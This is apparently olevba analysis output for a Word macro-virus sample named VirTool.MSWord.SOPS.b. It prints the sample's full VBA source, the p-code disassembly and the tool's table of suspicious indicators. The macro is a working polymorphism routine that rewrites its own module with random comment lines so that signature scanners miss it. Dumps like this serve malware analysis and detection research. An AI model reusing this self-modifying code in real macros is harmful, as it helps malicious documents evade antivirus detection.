olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./VirTool.MSWord.SOPS.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./VirTool.MSWord.SOPS.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SPS.bas 
in file: ./VirTool.MSWord.SOPS.b - OLE stream: 'Macros/VBA/SPS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub SomePolymorphicSystem()
Randomize
AktuelleZeilenAnzahl = Application.VBE.ActiveVBProject.VBComponents("SPS").CodeModule.CountOfLines
If AktuelleZeilenAnzahl > 76 Then
    Kleiner = Int(Rnd * (AktuelleZeilenAnzahl - 26))
        For ii = 1 To AktuelleZeilenAnzahl
            If Left(Application.VBE.ActiveVBProject.VBComponents("SPS").CodeModule.Lines(ii, 1), 3) = "Rem" Then
                Application.VBE.ActiveVBProject.VBComponents("SPS").CodeModule.DeleteLines ii
                x = x + 1
                If x = Kleiner Then Exit For
            End If
        Next
Else
PolySize = Int(Rnd * 10) + 1
    For PolyMorphic = 1 To PolySize
        PolyString = ""
        PolyLines = Application.VBE.ActiveVBProject.VBComponents("SPS").CodeModule.CountOfLines
        RndLine = Int(Rnd * PolyLines) + 1
        StringSize = Int(Rnd * 39) + 1
            For SomeString = 1 To StringSize
                PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
            Next SomeString
        Application.VBE.ActiveVBProject.VBComponents("SPS").CodeModule.InsertLines RndLine, "Rem " & PolyString
    Next PolyMorphic
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./VirTool.MSWord.SOPS.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1199 bytes
' Macros/VBA/SPS - 5948 bytes
' Line #0:
' 	FuncDefn (Sub SomePolymorphicSystem())
' Line #1:
' 	ArgsCall Read 0x0000 
' Line #2:
' 	LitStr 0x0003 "SPS"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St AktuelleZeilenAnzahl 
' Line #3:
' 	Ld AktuelleZeilenAnzahl 
' 	LitDI2 0x004C 
' 	Gt 
' 	IfBlock 
' Line #4:
' 	Ld Rnd 
' 	Ld AktuelleZeilenAnzahl 
' 	LitDI2 0x001A 
' 	Sub 
' 	Paren 
' 	Mul 
' 	FnInt 
' 	St Kleiner 
' Line #5:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AktuelleZeilenAnzahl 
' 	For 
' Line #6:
' 	Ld ii 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "SPS"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Rem"
' 	Eq 
' 	IfBlock 
' Line #7:
' 	Ld ii 
' 	LitStr 0x0003 "SPS"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #8:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #9:
' 	Ld x 
' 	Ld Kleiner 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	StartForVariable 
' 	Next 
' Line #12:
' 	ElseBlock 
' Line #13:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St PolySize 
' Line #14:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PolySize 
' 	For 
' Line #15:
' 	LitStr 0x0000 ""
' 	St PolyString 
' Line #16:
' 	LitStr 0x0003 "SPS"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St PolyLines 
' Line #17:
' 	Ld Rnd 
' 	Ld PolyLines 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St RndLine 
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0027 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St StringSize 
' Line #19:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld StringSize 
' 	For 
' Line #20:
' 	Ld PolyString 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyString 
' Line #21:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	Ld RndLine 
' 	LitStr 0x0004 "Rem "
' 	Ld PolyString 
' 	Concat 
' 	LitStr 0x0003 "SPS"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #23:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

